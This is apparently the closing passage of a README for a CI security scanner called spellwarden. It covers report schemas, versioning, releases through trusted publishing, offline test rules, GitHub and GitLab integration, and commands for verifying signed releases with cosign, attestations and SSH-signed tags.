`schemas/` holds JSON Schemas (draft 2020-12) for the settings, the baseline, the lock file and the JSON report, including every closed list of values. Readers of the report must ignore fields they do not know; the settings and the baseline refuse them. From 1.0.0, removing or renaming a field or a value, or changing an exit code, is a major version; adding an optional field, a notice code or a rule is a minor one. Since 1.2.0 the report holds an optional `connected` block when a run was connected (the credential kind, the organisation, the run, the policy applied, the registry gate's counts and items, and the upload outcome), and `upload_truncated` and `upload_truncated_fields` after an upload that was cut; a free run adds none of them.

## Versions

`spellwarden_scan.__version__` is the package version and `spellwarden_scan.RULES_VERSION` (`YYYY.MM.N`) the rule set's. A change to what any rule detects bumps both the rules version and the package minor version; a fix anywhere else bumps the patch. Every scan result carries both, so a stored finding always says which rules produced it.

## Releases

Releases are built and published by GitHub Actions through PyPI trusted publishing (OpenID Connect): a push of a tag `vX.Y.Z` whose version equals the one in `pyproject.toml` builds the sdist and the wheel and publishes them from the `pypi` environment. No API token exists anywhere. The sources are checked on Python 3.11, 3.12 and 3.13 on Linux, and on Python 3.13 on macOS and Windows, on every push; every workflow is checked with `actionlint`.

## Development

```
make check     # ruff, pytest, uv build
```

`tests/test_pure.py` fails the build if any module of `spellwarden_scan` reaches for the network, the file system or the environment; `tests/test_network_boundary.py` fails it if any module of `spellwarden_cli` other than the prober's fetcher (`net.py`), the usage ping (`ping.py`), the comment poster (`forge.py`) and the API client of connected mode (`api.py`) can reach the network; `tests/test_fixture_coverage.py` fails it if a rule lacks a positive or a negative fixture. Every test runs offline: HTTP exchanges are recorded under `tests/recorded/` and git repositories are made by the tests.

## Use it in CI

The same scanner runs in three wrappers, released with one version number. The Action and the component release at the same version.

**GitHub Actions.** Pin the Action by commit and keep the version in a comment. The workflow, not the Action, grants the permissions:

```yaml
on: [pull_request]
permissions:
  contents: read
  security-events: write   # code scanning alerts
  pull-requests: write     # the pull request comment
jobs:
  spellwarden:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<commit>
      - uses: spellwarden-ai/scan@<commit of v1.0.0>  # v1.0.0
```

Inputs, outputs and the behaviour on forks and Dependabot pull requests: [github.com/spellwarden-ai/scan](https://github.com/spellwarden-ai/scan). On a pull request the settings file and the baseline are read from the base commit (see "Settings"): keep `actions/checkout`'s default persisted credentials, or set `fetch-depth: 0`.

**GitLab CI/CD.**

```yaml
include:
  - component: gitlab.com/spellwarden-ai/scan/scan@1.0.0
```

Inputs, the comment token and the merge request comparison: [gitlab.com/spellwarden-ai/scan](https://gitlab.com/spellwarden-ai/scan). The merge request job clones with `GIT_DEPTH: "0"`, so the settings file and the baseline can be read from the merge base.

**Anywhere else.** `pipx run spellwarden==1.0.0 scan`, or the image `ghcr.io/spellwarden-ai/spellwarden:1.0.0`.

### Verifying what you run

Every surface of a release is signed, and one manifest ties them together.

```sh
# The PyPI files: PEP 740 attestations from trusted publishing
pip download spellwarden==1.0.0 --no-deps -d .
uvx pypi-attestations verify pypi --repository https://github.com/spellwarden-ai/spellwarden \
  pypi:spellwarden-1.0.0-py3-none-any.whl

# The image: keyless cosign signature and build provenance (the provenance also names the wheel inside it).
# The signature is in cosign 3's format: use cosign 3.0 or later (cosign 2 reports "no signatures found").
cosign verify ghcr.io/spellwarden-ai/spellwarden:1.0.0 \
  --certificate-identity https://github.com/spellwarden-ai/spellwarden/.github/workflows/release.yml@refs/tags/v1.0.0 \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com
gh attestation verify oci://ghcr.io/spellwarden-ai/spellwarden:1.0.0 --repo spellwarden-ai/spellwarden

# The Action and component tags: SSH-signed by the key in this repository's allowed_signers file
curl -fsSLO https://raw.githubusercontent.com/spellwarden-ai/spellwarden/main/allowed_signers
git clone https://github.com/spellwarden-ai/scan.git && \
  git -C scan -c gpg.ssh.allowedSignersFile="$PWD/allowed_signers" tag -v v1.0.0
git clone https://gitlab.com/spellwarden-ai/scan.git scan-gitlab && \
  git -C scan-gitlab -c gpg.ssh.allowedSignersFile="$PWD/allowed_signers" tag -v 1.0.0

# The release manifest: the wheel hash, the image digest and both tag commits, attested
gh release download v1.0.0 --repo spellwarden-ai/spellwarden --pattern release-manifest.json
gh attestation verify release-manifest.json --repo spellwarden-ai/spellwarden
```

The manifest's `wheel_sha256` equals the hash pinned in the Action's `requirements.txt`, its `image_digest` the digest in the component's `templates/scan.yml`, and its `action_commit` and `component_commit` the commits of the two tags.

## License

Apache-2.0. See `LICENSE`.
